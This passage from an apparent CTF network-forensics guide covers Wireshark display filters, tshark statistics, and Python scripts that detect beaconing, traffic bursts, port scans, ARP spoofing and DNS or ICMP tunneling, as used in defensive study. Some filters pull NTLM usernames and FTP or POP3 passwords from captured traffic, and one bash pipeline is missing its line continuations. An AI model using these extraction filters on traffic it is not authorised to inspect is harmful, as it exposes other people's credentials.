icmp.type == 0

# Destination Unreachable
icmp.type == 3

# Specific unreachable codes
icmp.type == 3 && icmp.code == 0  # Network unreachable
icmp.type == 3 && icmp.code == 1  # Host unreachable
icmp.type == 3 && icmp.code == 3  # Port unreachable
icmp.type == 3 && icmp.code == 4  # Fragmentation needed

# Time Exceeded
icmp.type == 11

# Redirect
icmp.type == 5

# Timestamp Request/Reply
icmp.type == 13 || icmp.type == 14
```

**ICMP Payload Analysis:**

```bash
# ICMP with data payload
icmp && data.len > 0

# Large ICMP packets (unusual)
icmp && frame.len > 100

# ICMP tunneling detection (data in payload)
icmp.type == 8 && data.len > 64
```

**ICMPv6 Filtering:**

```bash
# All ICMPv6
icmpv6

# Router Advertisement
icmpv6.type == 134

# Router Solicitation
icmpv6.type == 133

# Neighbor Advertisement
icmpv6.type == 136

# Neighbor Solicitation
icmpv6.type == 135
```

### ARP Advanced Filters

**ARP Operation Filtering:**

```bash
# ARP requests
arp.opcode == 1

# ARP replies
arp.opcode == 2

# Gratuitous ARP (source and target IP same)
arp.src.proto_ipv4 == arp.dst.proto_ipv4

# ARP announcements
arp.opcode == 1 && arp.src.proto_ipv4 == arp.dst.proto_ipv4
```

**ARP Spoofing Detection:**

```bash
# Multiple MACs for same IP (ARP poisoning)
# Requires manual inspection or scripting:
# tshark -r capture.pcap -Y "arp" -T fields -e arp.src.proto_ipv4 -e arp.src.hw_mac | sort | uniq

# Detect MAC changes for IP
arp.src.proto_ipv4 == 192.168.1.1
```

**ARP Pattern Analysis:**

```bash
# High ARP request volume (scanning)
arp.opcode == 1

# ARP requests for specific subnet
arp.dst.proto_ipv4 == 192.168.1.0/24

# Specific hardware type
arp.hw.type == 1  # Ethernet
```

### SMTP/POP3/IMAP Advanced Filters

**SMTP Filtering:**

```bash
# SMTP commands
smtp.req.command

# Specific commands
smtp.req.command == "EHLO"
smtp.req.command == "MAIL FROM"
smtp.req.command == "RCPT TO"
smtp.req.command == "DATA"
smtp.req.command == "AUTH"

# SMTP responses
smtp.response.code

# Success responses
smtp.response.code == 250

# Authentication required
smtp.response.code == 334

# Email content
smtp.data.fragment
```

**POP3 Filtering:**

```bash
# POP3 commands
pop.request.command

# Authentication
pop.request.command == "USER"
pop.request.command == "PASS"

# Email retrieval
pop.request.command == "RETR"
pop.request.command == "LIST"

# POP3 responses
pop.response.indicator == "+OK"
pop.response.indicator == "-ERR"
```

**IMAP Filtering:**

```bash
# IMAP requests
imap.request

# Authentication
imap.request contains "LOGIN"
imap.request contains "AUTHENTICATE"

# Mailbox operations
imap.request contains "SELECT"
imap.request contains "FETCH"
imap.request contains "SEARCH"

# IMAP responses
imap.response
```

### FTP Advanced Filters

**FTP Command Filtering:**

```bash
# All FTP commands
ftp.request.command

# Authentication
ftp.request.command == "USER"
ftp.request.command == "PASS"

# File operations
ftp.request.command == "RETR"  # Download
ftp.request.command == "STOR"  # Upload
ftp.request.command == "LIST"  # Directory listing
ftp.request.command == "CWD"   # Change directory
ftp.request.command == "DELE"  # Delete file

# Passive mode
ftp.request.command == "PASV"
ftp.response.code == 227  # Entering passive mode

# Active mode
ftp.request.command == "PORT"
```

**FTP Response Codes:**

```bash
# Success codes
ftp.response.code == 200  # Command okay
ftp.response.code == 226  # Transfer complete
ftp.response.code == 230  # User logged in

# Error codes
ftp.response.code == 530  # Not logged in
ftp.response.code == 550  # File unavailable

# Response code ranges
ftp.response.code >= 500  # Permanent errors
```

**FTP Data Channel:**

```bash
# FTP data transfers
ftp-data

# Large file transfers
ftp-data && frame.len > 1400

# Correlate with control channel
# tcp.stream eq X for FTP-DATA corresponding to control stream
```

### SMB/CIFS Advanced Filters

**SMB Version Filtering:**

```bash
# SMB1
smb

# SMB2/SMB3
smb2

# Both versions
smb || smb2
```

**SMB Command Filtering:**

```bash
# SMB2 commands
smb2.cmd == 0   # Negotiate
smb2.cmd == 1   # Session Setup
smb2.cmd == 3   # Tree Connect
smb2.cmd == 5   # Create (open file)
smb2.cmd == 6   # Close
smb2.cmd == 8   # Read
smb2.cmd == 9   # Write
smb2.cmd == 14  # Find (directory listing)

# File operations
smb2.cmd == 5 || smb2.cmd == 8 || smb2.cmd == 9
```

**SMB Filename Filtering:**

```bash
# SMB2 filename
smb2.filename

# Specific files
smb2.filename contains "flag"
smb2.filename contains ".txt"
smb2.filename matches ".*\\.(doc|xls|pdf)$"

# Path patterns
smb2.filename contains "\\Users\\"
smb2.filename contains "\\Documents\\"
```

**SMB Authentication:**

```bash
# NTLM authentication
ntlmssp

# NTLM challenge
ntlmssp.messagetype == 2

# NTLM authenticate
ntlmssp.messagetype == 3

# Extract usernames
ntlmssp.auth.username

# Extract domains
ntlmssp.auth.domain
```

### SSH Advanced Filters

**SSH Handshake:**

```bash
# SSH protocol
ssh

# SSH version exchange
ssh.protocol

# Key exchange
ssh.message_code == 20  # SSH_MSG_KEXINIT

# DH Key Exchange
ssh.message_code == 30  # SSH_MSG_KEXDH_INIT
ssh.message_code == 31  # SSH_MSG_KEXDH_REPLY
```

**SSH Authentication:**

```bash
# Authentication request
ssh.message_code == 50  # SSH_MSG_USERAUTH_REQUEST

# Authentication failure
ssh.message_code == 51  # SSH_MSG_USERAUTH_FAILURE

# Authentication success
ssh.message_code == 52  # SSH_MSG_USERAUTH_SUCCESS
```

**SSH Encrypted Traffic:**

```bash
# Encrypted packets (post-handshake)
ssh && tcp.len > 0 && !(ssh.message_code)

# Large SSH packets (potential data transfer)
ssh && frame.len > 1400
```

## Temporal Filtering

Temporal filtering isolates traffic based on time relationships, enabling identification of attack sequences, periodic beaconing, and time-based patterns.

### Absolute Time Filtering

**Frame Time Filtering:**

```bash
# Specific date and time
frame.time >= "2024-10-19 10:00:00" && frame.time <= "2024-10-19 11:00:00"

# Specific date
frame.time >= "2024-10-19 00:00:00" && frame.time < "2024-10-20 00:00:00"

# After specific time
frame.time > "2024-10-19 15:30:00"

# Before specific time
frame.time < "2024-10-19 12:00:00"

# Specific hour
frame.time >= "2024-10-19 14:00:00" && frame.time < "2024-10-19 15:00:00"

# Between two timestamps
frame.time >= "2024-10-19 10:15:30" && frame.time <= "2024-10-19 10:45:00"
```

**Date Range Examples:**

```bash
# All of October 2024
frame.time >= "2024-10-01 00:00:00" && frame.time < "2024-11-01 00:00:00"

# Specific week
frame.time >= "2024-10-14 00:00:00" && frame.time < "2024-10-21 00:00:00"

# Weekend only (manual date specification required)
frame.time >= "2024-10-19 00:00:00" && frame.time < "2024-10-21 00:00:00"
```

### Relative Time Filtering

**Time Since Capture Start:**

```bash
# First 10 seconds of capture
frame.time_relative < 10

# After first minute
frame.time_relative > 60

# Between 1-5 minutes
frame.time_relative > 60 && frame.time_relative < 300

# Last 30 seconds (requires knowing capture duration)
frame.time_relative > (MAX_TIME - 30)

# Specific time windows
frame.time_relative >= 100 && frame.time_relative <= 150
```

**Time Since Previous Packet:**

```bash
# Packets with delay >1 second from previous
frame.time_delta > 1

# Quick succession (<0.001 seconds)
frame.time_delta < 0.001

# Unusual gaps (potential connection issues)
frame.time_delta > 5

# Rapid packets (potential attack/scanning)
frame.time_delta < 0.0001
```

**Time Since Previous Displayed Packet:**

```bash
# When using display filter, time between displayed packets
frame.time_delta_displayed > 1

# Useful for analyzing filtered traffic temporal patterns
```

### Protocol-Specific Time Filtering

**DNS Response Time:**

```bash
# Slow DNS responses
dns.time > 1.0

# Fast DNS responses
dns.time < 0.01

# Specific response time range
dns.time > 0.5 && dns.time < 2.0

# Extract response times
# tshark -r capture.pcap -Y "dns.time" -T fields -e dns.qry.name -e dns.time
```

**TCP Round-Trip Time:**

```bash
# TCP packets with RTT information
tcp.analysis.ack_rtt

# High latency connections
tcp.analysis.ack_rtt > 0.5

# Low latency
tcp.analysis.ack_rtt < 0.01

# RTT for specific stream
tcp.stream eq 0 && tcp.analysis.ack_rtt
```

**HTTP Response Time:**

```bash
# Time between request and response
http.time

# Slow responses
http.time > 2.0

# Very slow (potential DoS or overload)
http.time > 10.0

# Fast responses (cached or simple)
http.time < 0.1
```

### Periodic Traffic Detection

**Beaconing Detection (requires tshark/scripting):**

```bash
# Extract timestamps for specific destination
tshark -r capture.pcap -Y "ip.dst == 203.0.113.50 && tcp.port == 443" \
-T fields -e frame.time_epoch

# Calculate intervals between connections (bash)

tshark -r capture.pcap -Y "ip.dst == 203.0.113.50 && tcp.flags.syn == 1 && tcp.flags.ack == 0"  
-T fields -e frame.time_epoch |  
awk 'NR>1 {print $1-prev} {prev=$1}'

# Look for consistent intervals (e.g., every 60 seconds = C2 beacon)
````

**Python Script for Beacon Detection:**

```python
#!/usr/bin/env python3
# beacon_detector.py

from scapy.all import *
from collections import defaultdict
import statistics
import sys

def detect_beacons(pcap_file, threshold=0.1):
    """
    Detect periodic beaconing behavior
    threshold: acceptable variance in interval timing (0.1 = 10%)
    """
    
    packets = rdpcap(pcap_file)
    
    # Track connection attempts per destination
    connections = defaultdict(list)
    
    for pkt in packets:
        if pkt.haslayer(IP) and pkt.haslayer(TCP):
            # Look for SYN packets (connection initiation)
            if pkt[TCP].flags & 0x02 and not (pkt[TCP].flags & 0x10):
                dst = f"{pkt[IP].dst}:{pkt[TCP].dport}"
                timestamp = float(pkt.time)
                connections[dst].append(timestamp)
    
    print("[*] Analyzing for periodic beaconing behavior...")
    print("=" * 70)
    
    beacons = []
    
    for dest, timestamps in connections.items():
        if len(timestamps) < 5:  # Need at least 5 connections
            continue
        
        # Calculate intervals
        timestamps.sort()
        intervals = [timestamps[i+1] - timestamps[i] 
                    for i in range(len(timestamps)-1)]
        
        if not intervals:
            continue
        
        # Statistical analysis
        mean_interval = statistics.mean(intervals)
        stdev_interval = statistics.stdev(intervals) if len(intervals) > 1 else 0
        coefficient_of_variation = stdev_interval / mean_interval if mean_interval > 0 else 0
        
        # Low coefficient of variation indicates regular intervals
        if coefficient_of_variation < threshold and mean_interval > 1:
            beacons.append({
                'destination': dest,
                'count': len(timestamps),
                'mean_interval': mean_interval,
                'stdev': stdev_interval,
                'cv': coefficient_of_variation,
                'intervals': intervals
            })
    
    if beacons:
        print(f"\n[!] Detected {len(beacons)} potential beaconing patterns:\n")
        
        for beacon in sorted(beacons, key=lambda x: x['cv']):
            print(f"Destination: {beacon['destination']}")
            print(f"  Connections: {beacon['count']}")
            print(f"  Mean Interval: {beacon['mean_interval']:.2f} seconds")
            print(f"  Std Deviation: {beacon['stdev']:.2f} seconds")
            print(f"  Regularity: {(1-beacon['cv'])*100:.1f}%")
            print(f"  [!] SUSPICIOUS: Highly regular traffic pattern")
            print()
    else:
        print("[+] No obvious beaconing patterns detected")

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <pcap_file>")
        sys.exit(1)
    
    detect_beacons(sys.argv[1])
````

### Time-of-Day Filtering

**Business Hours vs. Off-Hours:**

```bash
# Requires manual date/time specification
# Example: Traffic during business hours (9 AM - 5 PM)
(frame.time >= "2024-10-19 09:00:00" && frame.time < "2024-10-19 17:00:00")

# Off-hours traffic (suspicious for business network)
(frame.time >= "2024-10-19 00:00:00" && frame.time < "2024-10-19 06:00:00") || 
(frame.time >= "2024-10-19 22:00:00" && frame.time < "2024-10-20 00:00:00")

# Weekend traffic (if dates known)
frame.time >= "2024-10-19 00:00:00" && frame.time < "2024-10-21 00:00:00"
```

**Extracting Time Patterns with tshark:**

```bash
# Extract hour of day for all packets
tshark -r capture.pcap -T fields -e frame.time | \
awk -F'[ :]' '{print $2}' | sort | uniq -c

# Traffic distribution by hour
tshark -r capture.pcap -T fields -e frame.time | \
awk -F'[ :]' '{print $2":00"}' | sort | uniq -c | sort -n

# Identify busiest hours
tshark -r capture.pcap -T fields -e frame.time | \
awk -F'[ :]' '{print $2}' | sort | uniq -c | sort -rn | head -5
```

### Duration-Based Filtering

**Long-Running Connections:**

```bash
# TCP streams lasting >60 seconds
# Requires scripting to calculate stream duration

# Using tshark to find connection duration
tshark -r capture.pcap -q -z conv,tcp
# Shows conversations with duration column
```

**Short-Lived Connections:**

```bash
# SYN-SYN/ACK-FIN sequences (quick connections)
tcp.flags.syn == 1 && tcp.stream eq 0

# Then check if FIN appears shortly after
tcp.flags.fin == 1 && tcp.stream eq 0 && frame.time_relative < 1
```

**Script for Connection Duration Analysis:**

```bash
#!/bin/bash
# connection_duration.sh

PCAP=$1

echo "[*] Analyzing TCP connection durations..."

# Use tshark conversations feature
tshark -r "$PCAP" -q -z conv,tcp | \
grep -E "^\s*[0-9]" | \
awk '{print $6, $1":"$2, "->", $3":"$4}' | \
sort -rn | head -20

echo
echo "[*] Top 20 longest connections shown"
```

### Burst Detection

**Traffic Bursts (High Packet Rate):**

```bash
# Extract packets per second
tshark -r capture.pcap -T fields -e frame.time_epoch | \
awk '{print int($1)}' | uniq -c | sort -rn | head -10

# Identify burst periods
# High packet counts in single second indicate burst
```

**Python Burst Detector:**

```python
#!/usr/bin/env python3
# burst_detector.py

from scapy.all import *
from collections import defaultdict
import sys

def detect_bursts(pcap_file, threshold=100):
    """
    Detect traffic bursts (>threshold packets per second)
    """
    
    packets = rdpcap(pcap_file)
    
    # Count packets per second
    packets_per_second = defaultdict(int)
    
    for pkt in packets:
        timestamp = int(float(pkt.time))
        packets_per_second[timestamp] += 1
    
    print(f"[*] Detecting bursts (threshold: {threshold} packets/second)")
    print("=" * 60)
    
    bursts = []
    for timestamp, count in sorted(packets_per_second.items()):
        if count >= threshold:
            bursts.append((timestamp, count))
            print(f"[!] Burst detected at timestamp {timestamp}: {count} packets/sec")
    
    if bursts:
        print(f"\n[*] Total bursts detected: {len(bursts)}")
        max_burst = max(bursts, key=lambda x: x[1])
        print(f"[*] Maximum burst: {max_burst[1]} packets/sec at {max_burst[0]}")
    else:
        print("[+] No bursts exceeding threshold detected")
    
    # Calculate statistics
    avg_pps = sum(packets_per_second.values()) / len(packets_per_second)
    print(f"\n[*] Average packets per second: {avg_pps:.2f}")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <pcap_file> [threshold]")
        sys.exit(1)
    
    threshold = int(sys.argv[2]) if len(sys.argv) > 2 else 100
    detect_bursts(sys.argv[1], threshold)
```

### Sequence Analysis

**Events Following Other Events:**

```bash
# Find DNS query followed by HTTP request to resolved IP
# Requires multiple filters and manual correlation

# Step 1: Find DNS resolution
dns.qry.name == "target.com" && dns.a

# Note resolved IP and timestamp
# Step 2: Find HTTP to that IP shortly after
ip.dst == RESOLVED_IP && http && frame.time_relative > DNS_TIME
```

**Attack Chain Timeline:**

```bash
# Port scan followed by exploitation
# 1. Find port scanning (SYN to multiple ports)
tcp.flags.syn == 1 && tcp.flags.ack == 0 && ip.dst == TARGET

# 2. Note time range of scanning
# 3. Find connections to discovered open ports after scan
tcp.stream eq X && frame.time_relative > SCAN_END_TIME
```

## Statistical Filtering

Statistical filtering identifies anomalies and patterns through packet characteristics, enabling detection of unusual behavior, protocol violations, and attack indicators.

### Packet Size Analysis

**Size-Based Filtering:**

```bash
# Small packets (<100 bytes)
frame.len < 100

# Large packets (>1400 bytes, near MTU)
frame.len > 1400

# Exact size
frame.len == 64

# Size range
frame.len >= 500 && frame.len <= 1000

# Unusually large packets (potential fragmentation or jumbo frames)
frame.len > 1514  # Standard Ethernet MTU
frame.len > 9000  # Jumbo frames
```

**Protocol-Specific Size Filtering:**

```bash
# Large HTTP responses (file downloads)
http.response && frame.len > 1400

# Small HTTP requests (potential C2 check-in)
http.request && frame.len < 200

# Large DNS queries (tunneling indicator)
dns && frame.len > 512

# Oversized ICMP (covert channel)
icmp && frame.len > 128

# Small TCP segments (potential keepalive or probing)
tcp && tcp.len < 10 && tcp.len > 0
```

**Statistical Size Analysis Script:**

```bash
#!/bin/bash
# packet_size_analysis.sh

PCAP=$1

echo "[*] Packet Size Distribution Analysis"
echo "======================================"

# Calculate statistics
echo
echo "[*] Overall Statistics:"
tshark -r "$PCAP" -T fields -e frame.len | \
awk '{
    sum+=$1; 
    sumsq+=$1*$1; 
    if($1>max) max=$1; 
    if(min=="" || $1<min) min=$1; 
    count++
} 
END {
    mean=sum/count;
    variance=sumsq/count - mean*mean;
    stddev=sqrt(variance);
    print "  Count:", count;
    print "  Min:", min, "bytes";
    print "  Max:", max, "bytes";
    print "  Mean:", mean, "bytes";
    print "  Std Dev:", stddev, "bytes";
}'

# Size distribution
echo
echo "[*] Size Distribution:"
tshark -r "$PCAP" -T fields -e frame.len | \
awk '{
    if($1<100) small++;
    else if($1<500) medium++;
    else if($1<1000) large++;
    else if($1<1500) xlarge++;
    else oversized++;
    total++;
}
END {
    print "  <100 bytes:", small, sprintf("(%.1f%%)", small/total*100);
    print "  100-499:", medium, sprintf("(%.1f%%)", medium/total*100);
    print "  500-999:", large, sprintf("(%.1f%%)", large/total*100);
    print "  1000-1499:", xlarge, sprintf("(%.1f%%)", xlarge/total*100);
    print "  >=1500:", oversized, sprintf("(%.1f%%)", oversized/total*100);
}'

# Find unusual sizes
echo
echo "[*] Most Common Packet Sizes:"
tshark -r "$PCAP" -T fields -e frame.len | \
sort -n | uniq -c | sort -rn | head -10
```

### Traffic Volume Analysis

**Bandwidth Usage:**

```bash
# Calculate bytes per IP
tshark -r capture.pcap -q -z ip_hosts,tree

# Calculate bytes per conversation
tshark -r capture.pcap -q -z conv,tcp
tshark -r capture.pcap -q -z conv,udp

# Bytes by protocol
tshark -r capture.pcap -q -z io,phs
```

**High Volume Conversations:**

```bash
# Large TCP streams (requires scripting)
tshark -r capture.pcap -q -z conv,tcp | \
grep -E "^\s*[0-9]" | \
awk '{print $6, $1":"$2, "->", $3":"$4}' | \
sort -rn | head -10

# Bytes column shows total bytes transferred
```

**Traffic Rate Analysis:**

```bash
# Packets per second over time
tshark -r capture.pcap -q -z io,stat,1
# Shows 1-second intervals

# Custom intervals (5 seconds)
tshark -r capture.pcap -q -z io,stat,5

# Protocol-specific rates
tshark -r capture.pcap -q -z io,stat,1,"COUNT(tcp)tcp","COUNT(udp)udp","COUNT(icmp)icmp"
```

### Protocol Distribution

**Protocol Hierarchy Statistics:**

```bash
# Full protocol hierarchy
tshark -r capture.pcap -q -z io,phs

# Shows percentage of each protocol
# Example output:
# eth          frames:10000 bytes:5000000
#   ip         frames:9500 bytes:4800000
#     tcp      frames:8000 bytes:4000000
#       http   frames:5000 bytes:3000000
#     udp      frames:1500 bytes:800000
#       dns    frames:1000 bytes:500000
```

**Protocol Usage by Volume:**

```bash
# Count packets by protocol
echo "TCP packets:"
tshark -r capture.pcap -Y "tcp" | wc -l

echo "UDP packets:"
tshark -r capture.pcap -Y "udp" | wc -l

echo "ICMP packets:"
tshark -r capture.pcap -Y "icmp" | wc -l

echo "HTTP packets:"
tshark -r capture.pcap -Y "http" | wc -l

echo "DNS packets:"
tshark -r capture.pcap -Y "dns" | wc -l
```

### Endpoint Analysis

**Top Talkers (Most Active Hosts):**

```bash
# Top source IPs by packet count
tshark -r capture.pcap -T fields -e ip.src | \
sort | uniq -c | sort -rn | head -10

# Top destination IPs
tshark -r capture.pcap -T fields -e ip.dst | \
sort | uniq -c | sort -rn | head -10

# Top endpoints (source or destination)
tshark -r capture.pcap -T fields -e ip.src -e ip.dst | \
tr '\t' '\n' | sort | uniq -c | sort -rn | head -10

# By bytes (requires conversation statistics)
tshark -r capture.pcap -q -z endpoints,ip
```

**Port Usage Statistics:**

```bash
# Most common destination ports
tshark -r capture.pcap -T fields -e tcp.dstport -e udp.dstport | \
tr '\t' '\n' | grep -v "^$" | sort | uniq -c | sort -rn | head -20

# Source ports (ephemeral port analysis)
tshark -r capture.pcap -T fields -e tcp.srcport -e udp.srcport | \
tr '\t' '\n' | grep -v "^$" | sort | uniq -c | sort -rn | head -20

# Unusual high ports
tshark -r capture.pcap -Y "tcp.port > 49152 || udp.port > 49152" -T fields \
-e tcp.port -e udp.port | tr '\t' '\n' | grep -v "^$" | sort | uniq -c | sort -rn
```

### Connection Patterns

**Connection Count by IP:**

```bash
# TCP connections initiated by each IP
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" \
-T fields -e ip.src | sort | uniq -c | sort -rn

# Connections received by each IP
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" \
-T fields -e ip.dst | sort | uniq -c | sort -rn

# Unique destination ports per source IP (port scanning indicator)
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" \
-T fields -e ip.src -e tcp.dstport | \
awk '{ports[$1]++} END {for(ip in ports) print ports[ip], ip}' | sort -rn
```

**Connection Success/Failure Ratio:**

```bash
# SYN packets (connection attempts)
SYN_COUNT=$(tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" | wc -l)

# SYN-ACK packets (successful connections)
SYNACK_COUNT=$(tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 1" | wc -l)

# RST packets (rejected connections)
RST_COUNT=$(tshark -r capture.pcap -Y "tcp.flags.reset == 1" | wc -l)

echo "Connection attempts (SYN): $SYN_COUNT"
echo "Successful (SYN-ACK): $SYNACK_COUNT"
echo "Rejected (RST): $RST_COUNT"
echo "Success rate: $(echo "scale=2; $SYNACK_COUNT / $SYN_COUNT * 100" | bc)%"
```

### Error and Retransmission Analysis

**TCP Error Statistics:**

```bash
# Retransmissions
tshark -r capture.pcap -Y "tcp.analysis.retransmission" | wc -l

# Out-of-order packets
tshark -r capture.pcap -Y "tcp.analysis.out_of_order" | wc -l

# Duplicate ACKs
tshark -r capture.pcap -Y "tcp.analysis.duplicate_ack" | wc -l

# Zero window
tshark -r capture.pcap -Y "tcp.window_size == 0" | wc -l

# All TCP analysis flags
tshark -r capture.pcap -Y "tcp.analysis.flags" | wc -l
```

**Error Rate by Stream:**

```bash
# Streams with highest retransmission count
tshark -r capture.pcap -Y "tcp.analysis.retransmission" \
-T fields -e tcp.stream | sort | uniq -c | sort -rn | head -10
```

### DNS Statistics

**Query Type Distribution:**

```bash
# Count by query type
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.type | \
sort | uniq -c | sort -rn

# Most queried domains
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | \
sort | uniq -c | sort -rn | head -20

# NXDOMAIN rate
TOTAL_QUERIES=$(tshark -r capture.pcap -Y "dns.flags.response == 1" | wc -l)
NXDOMAIN=$(tshark -r capture.pcap -Y "dns.flags.rcode == 3" | wc -l)
echo "NXDOMAIN rate: $(echo "scale=2; $NXDOMAIN / $TOTAL_QUERIES * 100" | bc)%"
```

### HTTP Statistics

**HTTP Method Distribution:**

```bash
# Request methods
tshark -r capture.pcap -Y "http.request.method" -T fields -e http.request.method | \
sort | uniq -c | sort -rn

# Response code distribution
tshark -r capture.pcap -Y "http.response.code" -T fields -e http.response.code | \
sort | uniq -c | sort -rn

# Most requested URIs
tshark -r capture.pcap -Y "http.request.uri" -T fields -e http.host -e http.request.uri | \
sort | uniq -c | sort -rn | head -20

# User agents
tshark -r capture.pcap -Y "http.user_agent" -T fields -e http.user_agent | \
sort | uniq -c | sort -rn
```

**HTTP Response Time Statistics:**

```bash
# Average response time
tshark -r capture.pcap -Y "http.time" -T fields -e http.time | \
awk '{sum+=$1; count++} END {print "Average:", sum/count, "seconds"}'

# Slow responses (>2 seconds)
tshark -r capture.pcap -Y "http.time > 2" -T fields \
-e http.request.full_uri -e http.time | head -20
```

## Custom Column Creation

Custom columns enhance Wireshark's default display, allowing immediate visibility of critical information without expanding packet details.

### Creating Custom Columns

**Via GUI:**

```
Right-click column header → Column Preferences
→ Click "+" to add new column
→ Set Title, Type, and Field
```

**Column Types:**

- **Number**: Frame number (default)
- **Time**: Timestamp variations
- **Source/Destination**: Address fields
- **Protocol**: Protocol name
- **Length**: Packet length
- **Info**: Packet info summary
- **Custom**: User-defined field

### Essential Custom Columns for CTF

**TCP Stream Index:**

```
Title: TCP Stream
Type: Custom
Field: tcp.stream
```

Shows which TCP conversation the packet belongs to.

**TCP Flags:**

```
Title: TCP Flags
Type: Custom
Field: tcp.flags
```

Displays all TCP flags in hex (e.g., 0x018 for PSH-ACK).

**TCP Flags (Detailed):**

```
Title: SYN
Type: Custom
Field: tcp.flags.syn

Title: ACK
Type: Custom
Field: tcp.flags.ack

Title: RST
Type: Custom
Field: tcp.flags.reset

Title: FIN
Type: Custom
Field: tcp.flags.fin
```

Separate columns for individual flags (shows 0 or 1).

**HTTP Methods and Status:**

```
Title: HTTP Method
Type: Custom
Field: http.request.method

Title: HTTP Status
Type: Custom
Field: http.response.code

Title: HTTP Host
Type: Custom
Field: http.host

Title: HTTP URI
Type: Custom
Field: http.request.uri
```

**DNS Query Information:**

```
Title: DNS Query
Type: Custom
Field: dns.qry.name

Title: DNS Type
Type: Custom
Field: dns.qry.type

Title: DNS Answer
Type: Custom
Field: dns.a

Title: DNS Response Code
Type: Custom
Field: dns.flags.rcode
```

**TLS/SSL Information:**

```
Title: TLS SNI
Type: Custom
Field: tls.handshake.extensions_server_name

Title: TLS Version
Type: Custom
Field: tls.record.version

Title: TLS Cipher
Type: Custom
Field: tls.handshake.ciphersuite
```

**IP TTL (OS Fingerprinting):**

```
Title: IP TTL
Type: Custom
Field: ip.ttl
```

Different OS use different default TTLs:

- 64: Linux/Unix
- 128: Windows
- 255: Cisco/Network devices

**Payload Data:**

```
Title: TCP Payload
Type: Custom
Field: tcp.payload

Title: HTTP Data
Type: Custom
Field: http.file_data

Title: DNS TXT Data
Type: Custom
Field: dns.txt
```

**Network Identifiers:**

```
Title: VLAN ID
Type: Custom
Field: vlan.id

Title: SSID (Wireless)
Type: Custom
Field: wlan.ssid

Title: BSSID (Wireless)
Type: Custom
Field: wlan.bssid
```

**Frame Timing:**

```
Title: Time Delta
Type: Custom
Field: frame.time_delta

Title: Relative Time
Type: Custom
Field: frame.time_relative
```

**Analysis Flags:**

```
Title: TCP Analysis
Type: Custom
Field: tcp.analysis.flags

Title: Expert Info
Type: Custom
Field: _ws.expert
```

### Advanced Custom Column Examples

**Decoded Base64 Authorization:**

[Inference: Wireshark cannot automatically decode in columns, requires manual inspection]

```
Title: Authorization
Type: Custom
Field: http.authorization
```

Then manually decode Base64 values when inspecting.

**Computed Fields:**

**Payload Length (TCP):**

```
Title: Payload Len
Type: Custom
Field: tcp.len
```

**Window Scaling:**

```
Title: Win Scale
Type: Custom
Field: tcp.window_size_scalefactor
```

**UDP Stream:**

```
Title: UDP Stream
Type: Custom
Field: udp.stream
```

### CTF-Specific Column Sets

**Web Exploitation Column Set:**

1. No. (frame.number)
2. Time (frame.time_relative)
3. Source (ip.src)
4. Destination (ip.dst)
5. Protocol (protocol)
6. HTTP Method (http.request.method)
7. HTTP Host (http.host)
8. HTTP URI (http.request.uri)
9. HTTP Status (http.response.code)
10. Length (frame.len)

**Network Forensics Column Set:**

1. No.
2. Time
3. Source
4. Destination
5. TCP Stream (tcp.stream)
6. TCP Flags (tcp.flags)
7. Protocol
8. Info
9. TTL (ip.ttl)
10. Length

**DNS Analysis Column Set:**

1. No.
2. Time
3. Source
4. Destination
5. DNS Query (dns.qry.name)
6. DNS Type (dns.qry.type)
7. DNS Answer (dns.a)
8. DNS RCode (dns.flags.rcode)
9. Length

**Wireless Analysis Column Set:**

1. No.
2. Time
3. BSSID (wlan.bssid)
4. Source (wlan.sa)
5. Destination (wlan.da)
6. SSID (wlan.ssid)
7. Type/Subtype (wlan.fc.type_subtype)
8. Channel (wlan_radio.channel)
9. Signal (wlan_radio.signal_dbm)

### Saving and Loading Column Configurations

**Export Column Configuration:**

```
Edit → Preferences → Appearance → Columns
→ OK (saves to profile)
```

**Create Custom Profile with Columns:**

```
Edit → Configuration Profiles → New
→ Name: "CTF_Web_Analysis"
→ Configure columns as needed
```

**Switch Profiles:**

```
Bottom-right corner → Profile dropdown
→ Select desired profile
```

**Export Profile:**

```bash
# Profiles stored in:
# Linux: ~/.config/wireshark/profiles/
# Windows: %APPDATA%\Wireshark\profiles\
# macOS: ~/Library/Application Support/Wireshark/profiles/

# Copy entire profile directory
cp -r ~/.config/wireshark/profiles/CTF_Web_Analysis ~/backup/
```

### Practical CTF Scenarios

**Scenario: Finding Flag in HTTP Traffic**

Custom columns:

- HTTP URI
- HTTP File Data

Filter: `http.file_data contains "flag{"`

Quickly scan HTTP File Data column for flag pattern.

**Scenario: Tracking TCP Conversation**

Custom columns:

- TCP Stream
- TCP Flags
- TCP Payload

Filter: `tcp.stream eq 5`

Follow conversation flow with flag indicators.

**Scenario: DNS Tunneling Detection**

Custom columns:

- DNS Query
- DNS Query Length (dns.qry.name.len)
- DNS Type

Filter: `dns.qry.name.len > 50`

Sort by DNS Query Length to find anomalies.

**Scenario: Port Scanning Identification**

Custom columns:

- Source
- Destination Port (tcp.dstport)
- TCP Flags

Filter: `tcp.flags.syn == 1 && tcp.flags.ack == 0`

Group by Source to count ports scanned per host.

These advanced filtering and customization techniques provide powerful capabilities for rapid CTF traffic analysis, anomaly detection, and artifact discovery.

---

# Scripting & Automation

## Python Scapy Basics

### Installation and Setup

**Install Scapy:**

```bash
# Using pip
pip3 install scapy

# Install with additional dependencies
pip3 install scapy[complete]

# On Kali Linux (usually pre-installed)
apt-get install python3-scapy

# Verify installation
python3 -c "from scapy.all import *; print(conf.version)"
```

**Required Privileges:**

```bash
# Run with sudo for packet capture/injection
sudo python3 script.py

# Or use setcap to grant capabilities
sudo setcap cap_net_raw,cap_net_admin=eip /usr/bin/python3.11
```

### Basic Scapy Operations

**Interactive Mode:**

```python
# Start Scapy interactive shell
sudo scapy

# Basic commands in interactive mode
>>> ls()                    # List all protocol layers
>>> ls(IP)                  # Show IP layer fields
>>> lsc()                   # List all functions
>>> conf                    # Show configuration
